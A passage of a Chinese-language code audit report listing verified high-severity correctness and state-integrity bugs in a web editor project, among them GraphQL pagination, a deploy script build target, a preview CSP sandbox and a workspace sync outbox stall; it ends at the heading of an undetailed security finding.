**修复建议**: 让脚手架入口文件参与路径规划:把 `src/main.tsx` 作为模块输出(或作为其导入说明符经由 `targetModuleId` + `resolveInternalModuleImports` 解析的文件),使 `import App from './App'` 和 `<script src="/src/main.tsx">` 被改写为已预留的路径。或者在规划模块之前,先把脚手架自有路径(`src/main.tsx`、`src/App.tsx`、`src/App.test.tsx`、`src/vite-env.d.ts`、`src/prodivix-entry-surface.css`)预留进 `usedPaths`,并在 Workspace 代码文档请求其中之一时发出阻断性诊断。

**验证备注**: 经实测验证,而非仅靠阅读。引用的证据与 reactVite.ts:215-233 完全一致。链路如下:createWorkspaceCodeContribution(react/workspaceProject.ts:339-346)把 ts/js 代码文档作为 ExportModule 输出,其 desiredPath 为 joinExportPath('src', normalizeExportCodeArtifactPath(document.path));normalizeExportCodeArtifactPath(codeArtifactPlanner.ts:78-90)剥掉前导的 '/'、'code/' 和 'src/'。code.contribution 在 projectContributions 中排第 2(第 1269 行),而 app.module 位于最后一个贡献(第 1300 行);ExportProgramBuilder.addContribution 按顺序拼接模块(programBuilder.ts:75),plan() 按数组顺序预留 program.modules(planner.ts:623),早于文件贡献(planner.ts:696)。对 'react-entry' 类型,getModuleDirectory 返回 preset.sourceRoot 且 suggestedName 为 'App'(workspaceProject.ts:765-768),因此入口想要 src/App.tsx。我构造了一个最小 WorkspaceSnapshot(一个 pir-page 加一个代码文档),并对 codePath 为 '/src/App.tsx'、'/App.tsx'、'/code/App.tsx' 分别运行 generateWorkspaceReactViteBundle。三者都产出:entryFilePath 为 'src/App-2.tsx';文件 'src/App.tsx' 的 id 为 'workspace-code:code-app' 且内容是用户的原始源码;脚手架 'src/main.tsx' 仍包含 "import App from './App';";脚手架 'src/App.test.tsx' 仍导入 './App';metadata.pathRewrites = [{requestedPath:'src/App.tsx', emittedPath:'src/App-2.tsx', reason:'conflict', sourceKind:'react-entry'}];诊断中只有缺少许可证的条目——没有错误,没有任何阻断(blockingDiagnostics 保持为空,planner.ts:773)。'/App.tsx' 的情形根本没有产生任何 Workspace 校验诊断,因此一个完全合法的 Workspace 会静默地导出一个入口链指向用户文档而非编译应用的产物。没有任何守卫:reservePath 只记录一次改写(planner.ts:826-847),而唯一会抛出的只有 EXP-4001(缺少入口模块,planner.ts:724);planExportFileContributions(filePlanner.ts:27-40)不做任何导入改写,resolveInternalModuleImports 只修正模块之间基于 targetModuleId 的导入,而脚手架*文件*从来没有这种导入。对审查者推理的一处更正:vueVite.ts:176 的类比并不完全相同——在 Vue 中,src/App.vue 本身是一个文件贡献(vue/workspaceProject.ts:686),而 ts/js 代码模块会被 ensureFileExtension 强制加上 '.ts',因此 'App.vue' 不会被抢占;Vue 侧可达的变体是位于 /main.ts 的代码文档从脚手架手中抢走 src/main.ts,而 index.html 仍指向 /src/main.ts。这个细节并不削弱 React 侧的发现,后者是准确的。high 级别成立:主要交付物被静默地弄错,且没有任何诊断。

##### H-C-05 GraphQL 适配器把分页的 offsetInput/limitInput 当作 JSON Pointer,导致所有 offset 分页的 GraphQL operation 均失败

- **位置**: [`packages/data-graphql/src/dataGraphqlAdapter.ts:317`](packages/data-graphql/src/dataGraphqlAdapter.ts#L317)
- **类别**: correctness ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-data`

**详情**: `DataOffsetPaginationPolicy.offsetInput` / `limitInput` 是*输入属性名*,而不是指针:kernel 把它们作为键来读写(`packages/data/src/dataPolicyRuntime.ts:129,135` 的 `input[policy.limitInput]`),`validateDataPaginationPage` 同样按键读取,HTTP 适配器也使用 `record[policy.limitInput]`(`packages/data-http/src/dataHttpAdapter.ts:370,377`)。只有 GraphQL 适配器把它们喂给 `readPointer`,后者对任何不以 '/' 开头的字符串都会抛出 `DATA_GRAPHQL_CONFIGURATION_INVALID`。只要存在分页策略,每次成功的 `invoke` 都会调用 `pageSnapshot`(第 617 行)。该包中没有任何 GraphQL 分页测试,因此这一点没有覆盖。

**失败场景**: 配置一个 GraphQL query 操作,其 `policies.pagination = { kind: 'offset', offsetInput: 'offset', limitInput: 'limit', defaultLimit: 20, totalPath: '/total' }`(正是 HTTP 与 mock 测试中使用的形状)。上游请求成功,随后 `readInputInteger('offset', 0)` 调用 `readPointer(input, 'offset')`,抛出 `DataGraphqlOperationError('DATA_GRAPHQL_CONFIGURATION_INVALID', 'GraphQL mapping must use a canonical JSON Pointer.')`。该操作永远不会返回结果。改写成 `offsetInput: '/offset'` 也无济于事:kernel 会写入字面量键 `'/offset'`,而适配器读取的是 `input.offset`,于是产生 `DATA_PAGINATION_PAGE_MISMATCH`。

**修复建议**: 像 HTTP 适配器那样把分页输入当作顶层对象键来读取(`const record = input as DataJsonObject; const offset = record[policy.offsetInput]`),把 `readPointer` 只保留给响应侧的 `totalPath` / `nextCursorPath` / `previousCursorPath`。并补一个对照 `dataHttpAdapter.test.ts:567` 的 GraphQL offset 分页测试。

**验证备注**: 已通过 executeDataOperation 端到端复现。规范模型把 offsetInput/limitInput 视为属性*名*而非指针:packages/data/src/dataDocument.ts:1193-1220 用 readCanonicalString 校验它们(非空规范字符串,不要求是指针),packages/data/src/dataPolicyRuntime.ts:129/135/138-139 把它们作为键写入(`input[policy.limitInput]`、`[policy.offsetInput]: offset`),validateDataPaginationPage 在 190-196 行以同样方式读取,packages/data-http/src/dataHttpAdapter.ts:370/377 使用 `record[policy.limitInput]`。只有 packages/data-graphql/src/dataGraphqlAdapter.ts:317-318 把它们喂给 readPointer(第 135-144 行),后者对任何不以 '/' 开头的字符串抛出 DATA_GRAPHQL_CONFIGURATION_INVALID。只要存在分页策略,每次成功的 invoke 都会调用 pageSnapshot(第 617 行)。实测:策略 {kind:'offset', offsetInput:'offset', limitInput:'limit', defaultLimit:20, totalPath:'/total'},输入 {offset:0,limit:2},在传输层成功响应的情况下 -> DataGraphqlOperationError,错误码 DATA_GRAPHQL_CONFIGURATION_INVALID,消息 'GraphQL mapping must use a canonical JSON Pointer.';变通写法 {offsetInput:'/offset', limitInput:'/limit'} -> DataPaginationRuntimeError,错误码 DATA_PAGINATION_PAGE_MISMATCH,与审查者的预测完全一致,因此没有任何可行的编写配置。packages/data-graphql/src/dataGraphqlAdapter.test.ts 中分页覆盖率为零(grep 'pagination' 无结果)。生产可达:createDataGraphqlAdapter 在 apps/web/src/editor/features/execution/browserDataExecutionEnvironment.ts:133 注册。high 级别正确——该功能在运行时完全且不可恢复地失效。注意 cursor 分支不受影响,因为它读取的 nextCursorPath/previousCursorPath 确实是指针。

##### H-C-06 start-all.sh 构建的是后端库包而不是 ./cmd/server,因此部署出的 "backend" 二进制从来不是可运行的服务器

- **位置**: [`scripts/start-all.sh:211`](scripts/start-all.sh#L211)
- **类别**: correctness ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-cli-vscode-scripts`

**详情**: `apps/backend/server.go` 声明为 `package backend`(一个库);唯一的 `main` 包是 `apps/backend/cmd/server/main.go`。仓库中其他所有构建路径构建的都是 `./cmd/server`(`apps/backend/Dockerfile:10` -> `go build ... -o /out/backend ./cmd/server`,`apps/backend/.air.toml` -> `go build -o ./tmp/main.exe ./cmd/server`)。而 `scripts/start-all.sh` 构建的是 `.`,即那个库包,因此写入 `apps/backend/backend` 的产物并不是一个可执行的服务器。

**失败场景**: 运维人员在一台干净的服务器上运行 `./scripts/start-all.sh`。`go build -o backend .` 编译了非 main 的 `backend` 包。要么 (a) go 拒绝对非 main 包使用 `-o` 目标,在 `set -euo pipefail` 下部署在构建步骤中止;要么 (b) go 写出一个名为 `backend` 的包归档文件,随后第 226 行以 `nohup env ... apps/backend/backend &` 启动它,exec 失败并把 "Exec format error" 写入 `.logs/backend.log`,失败的 PID 仍被记录到 `.run/backend.pid`,而脚本照样打印 `==> Done` 和 `Backend: http://127.0.0.1:8080`,尽管根本没有后端进程在运行。

**修复建议**: 构建 main 包:`go build -o backend ./cmd/server`(与 Dockerfile 和 .air.toml 保持一致)。

**验证备注**: apps/backend/server.go:1 是 `package backend`(库),唯一的 main 包是 apps/backend/cmd/server/main.go。scripts/start-all.sh:211 逐字为 `go build -o backend .`。我在一个临时模块中复现了这次构建(模块根为非 main 包 + cmd/server/main.go):`go build -o backend .` 以 0 退出,并写出一个 Go 包归档文件,其文件头是 `!<arch>\n__.PKGDE`,而不是可执行文件。因此脚本的构建步骤会静默成功,第 226 行去 exec 位于 apps/backend/backend 的非可执行归档文件,PID 仍被写入 .run/backend.pid,脚本照样打印 `==> Done` / `Backend: http://127.0.0.1:8080`。另外两条构建路径(Dockerfile:10 与 .air.toml 的 `cmd`)都正确指向 ./cmd/server,而 .deploy.env.example 把 start-all.sh 记录为部署入口。唯一的更正:go 写出的归档文件不带可执行位,因此失败更可能是 `Permission denied` 而不是 `Exec format error`;结果(后端没有运行,部署却报告成功)不变。high 级别成立:这是唯一的脚本化部署路径,后端彻底且静默地失败。

##### H-C-07 预览宿主的 CSP `sandbox allow-scripts` 强制产生不透明 origin,导致每一条远程预览桥接消息都被编辑器的 origin 校验拒绝

- **位置**: [`apps/remote-preview-host/src/previewSecurityPolicy.ts:60`](apps/remote-preview-host/src/previewSecurityPolicy.ts#L60)
- **类别**: correctness ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `xcut-security`

**详情**: `createPreviewSecurityHeaders` 输出的 CSP 以 `sandbox allow-scripts` 指令结尾。CSP 的 sandbox 标志会与嵌入 iframe 的 `sandbox` 属性取并集(而绝不会放宽它),并且没有 `allow-same-origin`,因此预览文档被置于不透明 origin 中。于是它发出的每一次 `postMessage` 到达编辑器时 `event.origin === 'null'`,而不是 `https://<capability>.<preview-host>`。编辑器的关卡 `acceptsPreviewMessageOrigin` 要求 `input.messageOrigin === preview.origin`(blueprintProjectNetworkBridge.ts:54),而单元测试也明确断言 `messageOrigin: 'null'` 必须被拒绝(blueprintProjectNetworkBridge.test.ts:114-121)。反方向同样被打断:`BlueprintProjectRunnerSurface.tsx:128/163/192` 用 `frameWindow.postMessage(response, previewOrigin)` 回复,而这永远不会投递到不透明 origin 的文档。两个组件对预览文档的 origin 认知不一致,而这种不一致只有在真实浏览器中才会显现,origin 字符串层面的单元测试看不出来。

**失败场景**: 用户启动一次远程(`provider === 'remote'`)项目运行。后端在 `https://<64-hex>.preview.example/` 处物化出预览授权(remotePreviewOriginClient.ts:64 强制该形态),预览界面将其嵌入。编译后的应用调用了一个 Server Function,于是 `standaloneServerRuntime.ts:320` 执行 `parent.postMessage({type:'prodivix.execution-server-function-gateway-request.v1', ...}, '*')`。编辑器的 `onMessage` 收到它时 `event.origin === 'null'`;`readBlueprintRemoteServerFunctionBridgeMessage` 返回 `undefined`,处理函数直接落空返回,访客侧的 promise 在 30 秒后以 `SVR_REMOTE_GATEWAY_TIMEOUT` 拒绝。同样地,所有远程 Data Gateway 请求、流的打开/拉取以及 console 桥接记录都被静默丢弃,因此远程预览既没有数据也没有 console 输出,而且任何地方都没有诊断信息。

**修复建议**: 确定一种 origin 模型并让两侧保持一致。要么去掉 CSP 的 `sandbox` 指令(按会话划分的 capability 子域,加上 `frame-ancestors`、COOP/COEP 和 `connect-src` 已经隔离了预览,而且嵌入的 iframe 本身也设置了自己的 `sandbox` 属性),要么保留 `sandbox`,并把编辑器的关卡改为:*仅当*帧身份校验(`isBlueprintProjectFrameMessageSource`)通过且 provider 为 `remote` 时,才接受 `messageOrigin === 'null'`,同时用 `'*'` 而不是 `previewOrigin` 回复。再增加一个浏览器级(而非字符串级)的一致性测试,真正端到端地跑通该桥接。

**验证备注**: 证据吻合:previewSecurityPolicy.ts:60 输出 `sandbox allow-scripts` 且没有 `allow-same-origin`,previewHttpHandler.ts:292 对每一个提供的预览文件(包括 HTML 入口)都应用 createPreviewSecurityHeaders。按照 HTML 规范,文档的活动沙箱标志集是 iframe 属性标志与 CSP 强制沙箱标志集的并集,因此 BlueprintProjectRunnerSurface.tsx 的 `sandbox="allow-same-origin allow-scripts"`(remote 分支)无法恢复出元组 origin;文档得到的是不透明 origin,postMessage 投递时 `event.origin === 'null'`。编辑器把 `messageOrigin: event.origin` 传入每一个解码器,而 acceptsPreviewMessageOrigin(blueprintProjectNetworkBridge.ts:54)要求 `input.messageOrigin === preview.origin`,blueprintProjectNetworkBridge.test.ts:106-121 处的测试以及属性测试都断言 'null' 必须被拒绝。回复方向同样被打断(BlueprintProjectRunnerSurface.tsx:128/163/192 的 `frameWindow.postMessage(response, previewOrigin)`)。remote-preview-host 的 README 甚至把该文档描述为 'opaque sandbox',同时依赖一个 'value-only parent-frame bridge',这印证了两个组件确实存在认知分歧。唯一真正跑通该桥接的浏览器关卡(goldenG2VueCatalogRemote.browser.test.ts)使用了自己的 harness 宿主页,只做 event.source 校验并使用 `postMessage(..., '*')`,因此无法捕获此问题。高严重度成立:它静默地让所有远程 Data、流、Server Function 与 console 桥接失效,且没有任何诊断。它是失败关闭的(无安全影响),这也是我不进一步提升严重度的原因。

#### 4.2.2 状态完整性(state-integrity)

##### H-SI-01 未产生任何 operation 的冲突解决从不清除被阻塞的 outbox 条目,使队列永久停滞

- **位置**: [`apps/web/src/editor/workspaceSync/workspaceConflictResolutionExecutor.ts:84`](apps/web/src/editor/workspaceSync/workspaceConflictResolutionExecutor.ts#L84)
- **类别**: state-integrity ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-store-sync`

**详情**: 只要 `createWorkspaceConflictResolutionOperation` 产出的 operation 为 null(即审阅结果已经等于远端 snapshot——用户对每个冲突都选择 "remote" 时的正常结果),`executeWorkspaceConflictResolution` 就会以 `kind: 'already-applied'` 提前返回。这次提前返回完全不触碰 outbox store,因此被 `blockWorkspaceOutboxEntry` 置为 `state.kind === 'conflict'` 的条目会永远留在 IndexedDB 中。`isWorkspaceOutboxEntryClaimable`(packages/workspace-sync/src/workspaceOutbox.ts:238)对 'conflict' 返回 false,而 `selectWorkspaceOutboxClaimCandidate` 只考察因果队头,因此这一个条目会阻止该 Workspace 之后所有 authoring operation 抵达服务端。对比 operation 路径:替换被阻塞条目的是 `persistInitialEntry`(workspaceOutboxExecutor.ts:433-446),而它只有在 `built.operation` 非空时才会被执行到。现有测试 `returns a null operation when the reviewed result already equals remote`(workspaceConflictResolutionExecutor.test.ts:195)使用的会话没有 `sourceOperation`,也从不对 `outboxStore` 做断言,因此这一缺口没有测试覆盖。

**失败场景**: 用户编辑 page-home;提交返回 409;`recoverClaimedEntry` 阻塞条目 E(状态 'conflict',会话 S 的 sourceOperation = E.operation)并打开冲突界面。用户对这唯一的冲突选择 "remote",于是 `session.resolvedSnapshot` 与 `session.remoteSnapshot` 深度相等。`createWorkspaceResolutionOperation` 不构建任何草稿,返回 `{ok:true, operation:null}`(workspaceResolutionOperation.ts:511)。`executeWorkspaceConflictResolution` 返回 `already-applied` 而不调用 `executeWorkspaceOutboxOperation`,因此条目 E 从未被替换或移除。界面调用 `clearConflict(session.id)`,用户继续编辑。此后每一个 authoring operation 都被排在 E 之后而永远发不出去——每次排空时 `resumeWorkspaceOutbox` 从 `claimNext` 拿到的都是 `null`——于是后续所有工作只以乐观状态存在于内存和本地副本中,并在清除缓存时静默丢失。再次解决该冲突仍会得到 `operation: null`,因此没有任何脱困路径。

**修复建议**: 在因 operation 为 null 而返回 `already-applied` 之前,先移除/替换该会话来源的被阻塞条目:当 `effectiveSession.sourceOperation` 存在时,调用 `store.remove(getWorkspaceOperationId(sourceOperation))`(或用不含空操作的后续条目执行 `store.replace`),并调用 `notifyWorkspaceOutboxChanged(session.workspaceId)`,从而释放因果队头。

**验证备注**: 引用的证据与 workspaceConflictResolutionExecutor.ts:84-90 完全一致。null-operation 路径在生产中可达:WorkspaceRevisionConflictSurface.applyResolution(第 404 行)在 prepareWorkspaceConflictResolution 之后调用 executeWorkspaceConflictResolution;当没有产生草稿时 createWorkspaceResolutionOperation 返回 {ok:true, operation:null}(workspaceResolutionOperation.ts:511),而这正是所有冲突都解决为 'remote' 且没有非冲突本地改动时发生的情况。提前返回不触碰任何 store,并且我确认没有其他代码路径会移除或替换 'conflict' 条目:git grep 显示唯一的替换来自 persistInitialEntry(workspaceOutboxExecutor.ts:438-444),仅在 built.operation 非空时可达;requeueFailedWorkspaceOutboxOperation 只处理 'failed';useWorkspaceSaveIndicator 只做上报。isWorkspaceOutboxEntryClaimable(workspaceOutbox.ts:227-239)对 'conflict' 返回 false,selectWorkspaceOutboxClaimCandidate(241-253)只考察因果队头,而 compareEntries 会把更旧的被阻塞条目保留在队头,因此队列确实停滞。Session.sourceOperation 是被填充的(workspaceRevisionRecovery.ts:91-93),所以替换条目的路径存在,却被这次提前返回跳过。所引用的测试(第 196 行)确实缺少任何 outboxStore 断言。严重级别从 critical 下调为 high:保存指示器确实会呈现 'Workspace changes require revision-conflict review'(useWorkspaceSaveIndicator.ts:102-119),因此停滞是有提示的而非静默的,且要造成持久性丢失还需要额外的清除缓存动作。

##### H-SI-02 WorkspaceOutboxEffects 用陈旧的冲突会话 snapshot 覆盖实时 Workspace,丢弃此后的全部编辑

- **位置**: [`apps/web/src/editor/workspaceSync/WorkspaceOutboxEffects.tsx:157`](apps/web/src/editor/workspaceSync/WorkspaceOutboxEffects.tsx#L157)
- **类别**: state-integrity ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-store-sync`

**详情**: 在排空循环结束后,如果 outbox 队头处于 `state.kind === 'conflict'` 且 store 当前的冲突 id 与该会话不匹配,该 effect 就会调用 `state.setWorkspaceSnapshot(operationHead.state.session.localSnapshot)`。`setWorkspaceSnapshot`(editorStore.workspaceSlice.ts:253-271)会替换整个 canonical snapshot,清空 `workspaceHistory` 和 `documentEditSeqById`,并把 `workspaceRevisionConflict` 置空。这里没有三方合并,没有与实时 snapshot 做 revision/opSeq 比较,也没有让用户选择——用户在冲突会话被捕获之后编写的一切都被销毁。该逻辑在挂载时、每次 `notifyWorkspaceOutboxChanged` 时以及每次 `online` 事件时都会运行。

**失败场景**: 存在一个针对会话 S1 的被阻塞冲突条目(例如来自上面的 null-operation 路径,或在 `clearWorkspaceRevisionConflict` 被调用之后,或当 `adoptWorkspaceRemoteSnapshot` 打开了第二个冲突 S2 导致 `openWorkspaceRevisionConflict(S1)` 返回 false)。用户继续编辑:又有 20 条命令被乐观地应用。下一次任何 outbox 变更触发 `run()` 时——包括紧接着这次编辑的 `notifyWorkspaceOutboxChanged`——循环后的分支发现 `operationHead.state.kind === 'conflict'` 且 `state.workspaceRevisionConflict?.id !== S1.id`,于是编辑器 snapshot 被重置为 S1.localSnapshot。这 20 条命令和整个撤销栈在 UI 中无提示地消失,已经解决的冲突也被重新打开。

**修复建议**: 不要在这里改写 canonical snapshot。只重新打开冲突会话(`openWorkspaceRevisionConflict`),让 `prepareWorkspaceConflictResolution` 折叠会话捕获之后所做的编辑;如果确实需要协调实时 snapshot,应经由 `autoRebaseWorkspaceSnapshots`/`adoptWorkspaceRemoteSnapshot` 处理,使分歧产生一个新的显式冲突,而不是静默覆盖。

**验证备注**: 引用的证据与 WorkspaceOutboxEffects.tsx:151-160 一致。setWorkspaceSnapshot(editorStore.workspaceSlice.ts:253-271)确实会替换整个 snapshot,通过 resetWorkspaceHistory 重置 workspaceHistory(第 145-151 行 -> createWorkspaceHistoryState 生成空栈),清空 documentEditSeqById 并把 workspaceRevisionConflict 置空,且没有任何三方合并或 opSeq/revision 比较。只要 outbox 队头为 'conflict' 且 store 的冲突 id 不同,该分支就会触发,而在存在更新的实时编辑的情况下,至少有两条生产路径可达:(a) 在 Claim 0 的 null-operation 解决之后界面调用 clearConflict,于是 workspaceRevisionConflict 为空,下一次编辑的 notifyWorkspaceOutboxChanged 会重新进入 run();(b) prepareWorkspaceConflictResolution 返回 kind:'conflict' 会让界面打开一个新的会话 id(WorkspaceRevisionConflictSurface.tsx:377-379),而 outbox 条目仍携带旧会话。两种情况下循环都会立即中断(claimNext 无法认领 'conflict' 队头),循环后的分支便把实时 Workspace 回滚到 session.localSnapshot。该分支对冷重载恢复场景是合理的;缺陷在于缺少对已经推进到会话之后的实时 Workspace 的守卫。严重级别为 high 而非 critical:随后会立即打开冲突弹窗,用户不会毫不知情,并且持久化的 outbox 条目本身没有被销毁。

##### H-SI-03 GraphQL/AsyncAPI mutation 在上游成功,却被报告为 503 并被永久封锁

- **位置**: [`apps/backend/internal/modules/remoteexecution/data_gateway_replay_store.go:62`](apps/backend/internal/modules/remoteexecution/data_gateway_replay_store.go#L62)
- **类别**: state-integrity ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-remoteexec-integrations`

**详情**: decodeDataGatewayReplayResult 把 result.Network.Adapter != "core.http" 硬编码为拒绝条件,而 invokeProtocol 写入的是 Adapter: plan.adapter,其值为 core.graphql 或 core.asyncapi(data_gateway_protocol.go:249 与 :341)。CompleteDataGatewayMutation(data_gateway_replay_store.go:190)对序列化后的结果运行同一个解码器,因此每一个协议适配器的 mutation 都无法记录其重放行。invokeProtocol 会把它转换为 ErrDataGatewayUnavailable(data_gateway_protocol.go:530-532),而由于 mutationResolved 从未被置位,延迟执行的 FenceDataGatewayMutation(data_gateway_protocol.go:442-446)会把该次调用标记为 'indeterminate',此后 resolveDataGatewayMutationReplayClaim(第 88 行)一律以 ErrDataGatewayReplayUnsafe 作答。单元测试没能发现它,是因为伪造的 replay store(data_gateway_test.go:107)不校验 adapter,而所有 store 层的固定装置都使用 Adapter: "core.http"(data_gateway_replay_store.integration_test.go:188)。

**失败场景**: 一次预览执行调用了 GraphQL mutation 操作(adapterId 为 core.graphql,kind 为 mutation)。上游服务器接受了它并执行了副作用(例如创建了一个订单)。随后 CompleteDataGatewayMutation 在 adapter 检查处返回 ErrDataGatewayReplayConflict;客户端收到 HTTP 503 ENV-5001,该次调用被封锁为 'indeterminate',之后每次重试都永远得到 409 DATA_MUTATION_REPLAY_UNSAFE。副作用已经发生,产品却报告失败并阻断了恢复。

**修复建议**: 接受 gateway 能够产生的完整 adapter 集合(core.http、core.graphql、core.asyncapi)——最好把预期 adapter 串接进重放键,使其按调用固定下来——并补充一个在 store 层完成 core.graphql mutation 重放的测试。

**验证备注**: decodeDataGatewayReplayResult(data_gateway_replay_store.go:62)确实把 result.Network.Adapter != "core.http" 硬编码为拒绝条件,而 invokeProtocol 以 Adapter: plan.adapter 构建 trace(data_gateway_protocol.go:523),其中 plan.adapter 为 "core.graphql"(protocol.go:249)或 "core.asyncapi"(protocol.go:341)。CompleteDataGatewayMutation 会序列化结果并重新运行该解码器(data_gateway_replay_store.go:186-192),因此对任何协议适配器的 mutation,它都会在触碰数据库之前直接返回 ErrDataGatewayReplayConflict。invokeProtocol 把它映射为 ErrDataGatewayUnavailable(protocol.go:530-532)并让 mutationResolved 保持为 false,于是延迟执行的 FenceDataGatewayMutation(protocol.go:442-446)把该行标记为 'indeterminate';resolveDataGatewayMutationReplayClaim(:88-89)此后对每一次后续尝试都以 ErrDataGatewayReplayUnsafe 作答。可达性已确认:parseDataGatewayDocument 接受 core.graphql/core.asyncapi 数据源(data_gateway.go:49),Invoke 把非 http 适配器分发给 invokeProtocol(data_gateway.go:574-576),Workspace 校验器也接受 core.graphql 文档(domain_document_validator_test.go:98)。测试盲区已确认:伪造 store 的 CompleteDataGatewayMutation(data_gateway_test.go:107-118)从不调用该解码器,而唯一的 store 层固定装置使用 Adapter: "core.http"(integration_test.go:188)。high 级别成立——上报失败时上游副作用已经执行,且该次调用被永久封锁。

##### H-SI-04 三路合并留下悬空的 activeDocumentId,使本来干净的自动 rebase 永久失败,并让整个 Durable Outbox 停摆

- **位置**: [`packages/workspace-sync/src/workspaceThreeWay.ts:717`](packages/workspace-sync/src/workspaceThreeWay.ts#L717)
- **类别**: state-integrity ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `xcut-architecture`

**详情**: `mergeWorkspace` 按 remote 的 -> local 的 -> `undefined` 的顺序计算 `activeDocumentId`,但随后构造候选 snapshot 时先展开 `...remote`,而对新值只做条件展开。当计算结果为 `undefined` 时(remote 与 local 的活动文档都被合并移除),`remote.activeDocumentId` 会经由 `...remote` 存活下来,并指向一个已不在 `docsById` 中的文档。`validateWorkspaceVfs.ts:473` 恰好会拒绝这种情况,因此 `autoRebaseWorkspaceSnapshots`(第 786-802 行)会对一次产生零冲突的合并返回 `status: 'invalid'`。接着 `analyzeWorkspaceRevisionFailure`(apps/web/src/editor/workspaceSync/workspaceRevisionRecovery.ts:81)抛出 `WorkspaceRevisionRecoveryError`,`recoverClaimedEntry` 把它路由到 `persistFailure`,`toOutboxFailure` 将其归类为不可重试 -> 该 outbox 条目变为 `failed`。由于 `selectWorkspaceOutboxClaimCandidate` 只认领因果链头部,处于 `failed` 的头部会阻塞该 workspace 之后的所有编辑操作,而手动重新排队会重新计算出完全相同的合并并再次失败。同一个非法 snapshot 还会被 `adoptRebasedWorkspaceOperation`(apps/web/src/editor/store/editorStore.workspaceSlice.ts:516-525)未经校验地采纳。

**失败场景**: 恢复路径会使 `local.activeDocumentId` 始终缺失:`applyPersistentWorkspaceOperation`(packages/workspace-sync/src/workspaceOperationCommit.ts:140-144)会剥离 `activeDocumentId`,而 `resumeWorkspaceOutbox` 把它的结果用作 `optimisticSnapshot`/`localSnapshot`。服务端 snapshot 则总会带有该字段,因为 `decodeWorkspace` 会设置 `activeDocumentId = candidate ?? resolveCanonicalWorkspaceDocumentId(documents)`(packages/workspace/src/workspaceCodec.ts:545-546),而后端从不发送该字段。于是:workspace 中有 pir-page P1 与 P2(没有 `/pir.json`);排队的持久化操作删除 P1;因为另一个会话修改了无关文档,提交返回 409。合并结果:`docsById` = {P2, ...}(P1 已移除,无冲突)。`remote.activeDocumentId` = P1(不在 docsById 中),`local.activeDocumentId` = undefined -> `activeDocumentId` = undefined -> 候选 snapshot 仍然带着来自 `...remote` 的 `activeDocumentId: 'P1'`。`validateWorkspaceSnapshot` 报出 'activeDocumentId must reference an existing document' -> 自动 rebase 报告 'invalid' -> 该条目被标记为 `failed` -> 该 workspace 后续所有 Workspace 提交都停止同步。

**修复建议**: 构造 snapshot 时不要继承陈旧的选中项,例如先把它解构出来:`const { activeDocumentId: _stale, ...remoteWithoutSelection } = remote;`,展开 `remoteWithoutSelection`,再应用条件式的 `activeDocumentId`。补一个回归测试:让 remote 与 local 的活动文档都被合并移除,并断言 `validateWorkspaceSnapshot(candidateSnapshot).valid === true`。

**验证备注**: 引用的证据与 workspaceThreeWay.ts:699-717 完全吻合。我在 packages/workspace-sync 中用一个临时 vitest 实证复现了该缺陷:base = 两个 pir-page(document-1/document-2,activeDocumentId=document-1),local = 在 base 基础上删除 document-1 并剥离 activeDocumentId(这正是 workspaceOperationCommit.ts:133-144 的 applyPersistentWorkspaceOperation 所产生的结果,也正是 resumeWorkspaceOutbox 在 workspaceOutboxExecutor.ts:519-542 处作为 optimisticSnapshot/localSnapshot 传入的内容),remote = 在 base 基础上做一次无关编辑。autoRebaseWorkspaceSnapshots 返回 {ok:false,status:'invalid',issues:[WKS_SYNC_MERGED_SNAPSHOT_INVALID -> WKS_ACTIVE_DOCUMENT_MISSING 'activeDocumentId must reference an existing document', documentId 'document-1']},且冲突数为零 —— 也就是说 `...remote` 展开的值确实如所述那样越过条件展开存活了下来。下游每一环的可达性均已验证:(a) 后端从不发送 activeDocumentId(apps/backend/internal/modules/workspace/handlers.go:75-84 的 snapshotResponse 没有该字段,persistentWorkspacePatchOps 也会剥离 /activeDocumentId 操作),因此 decodeWorkspace 总会通过 resolveCanonicalWorkspaceDocumentId(workspaceCodec.ts:545-546)推导出一个 = /pir.json 页面,否则是根页面,再否则是第一个 pir-page —— 删除该页面属于普通编辑行为;(b) 在 status 为 'invalid' 时 analyzeWorkspaceRevisionFailure 抛出 WorkspaceRevisionRecoveryError(workspaceRevisionRecovery.ts:79-81);(c) recoverClaimedEntry 捕获它并调用 persistFailure(workspaceOutboxExecutor.ts:227-238),toOutboxFailure 把非 TypeError 的 Error 归类为 CLIENT_ERROR、retryable:false,于是 failWorkspaceOutboxEntry 将其标记为 failed;(d) isWorkspaceOutboxEntryClaimable 对 'failed' 返回 false,而 selectWorkspaceOutboxClaimCandidate 只会返回排序后的头部(workspaceOutbox.ts:227-253),indexedDbCausalOutboxStore.claim/claimNext 都经由它,因此该 workspace 之后的每一个操作都被永久阻塞;(e) 唯一的出路是 requeueFailedWorkspaceOutboxOperation,而它会重放同样的 base/local/remote 三元组并以相同方式失败 —— 不存在丢弃路径。唯一不准确之处:关于 adoptRebasedWorkspaceOperation 的附带说明没有意义(非法路径在采纳之前就已抛出)。高严重度成立:持久化的编辑工作停止同步,且用户没有可达的恢复手段。

#### 4.2.3 安全(security)

##### H-SEC-01 GitHub installation 安装回调让任意用户获得对任意 installation ID 的访问权

- **位置**: [`apps/backend/internal/modules/integrations/github/store.go:296`](apps/backend/internal/modules/integrations/github/store.go#L296)
- **类别**: security ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-remoteexec-integrations`

